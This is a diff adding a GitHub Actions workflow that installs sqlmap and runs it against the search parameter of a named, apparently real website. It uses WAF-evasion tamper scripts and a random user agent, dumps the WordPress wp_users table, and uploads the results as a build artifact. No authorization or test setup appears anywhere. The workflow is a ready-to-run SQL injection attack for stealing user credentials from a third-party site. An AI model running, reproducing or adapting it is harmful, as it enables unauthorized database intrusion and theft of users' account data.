@@ -1,0 +1,26 @@
+name: sqlmap user dump
+
+on:
+  workflow_dispatch:
+
+jobs:
+  sqlmap:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install sqlmap
+        run: sudo apt update && sudo apt install sqlmap -y
+
+      - name: Run sqlmap on ?s parameter
+        run: |
+          sqlmap -u "https://dallolgebeya.com/?s=test" \
+            --batch --level=3 --risk=2 --random-agent \
+            --tamper=space2comment,between,randomcase \
+            --time-sec=3 --delay=2 --threads=1 \
+            --dbms=mysql -T wp_users --dump --no-cast \
+            --output-dir=./sqlmap_out
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: sqlmap-dump
+          path: ./sqlmap_out
